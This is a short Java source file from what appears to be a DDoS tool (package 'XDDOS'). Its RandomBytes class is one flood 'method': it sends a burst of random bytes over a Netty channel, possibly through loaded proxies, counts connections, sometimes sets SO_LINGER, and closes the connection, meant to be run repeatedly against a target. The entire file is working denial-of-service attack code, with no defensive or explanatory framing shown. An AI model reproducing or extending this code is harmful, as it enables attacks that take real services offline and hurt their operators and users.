package XD.XDDOS.methods.impl;

import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.proxy.ProxyLoader;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import io.netty.channel.ChannelOption;
import java.security.SecureRandom;

public class RandomBytes implements IMethod {
  private static final SecureRandom RANDOM = new SecureRandom();
  
  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    byte[] bytes = new byte[4 + RANDOM.nextInt(128)];
    RANDOM.nextBytes(bytes);
    channel.writeAndFlush(Unpooled.buffer().writeBytes(bytes));
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
    if (RANDOM.nextBoolean()) {
      channel.config().setOption(ChannelOption.SO_LINGER, Integer.valueOf(1));
    }
    
    channel.close();
  }
}
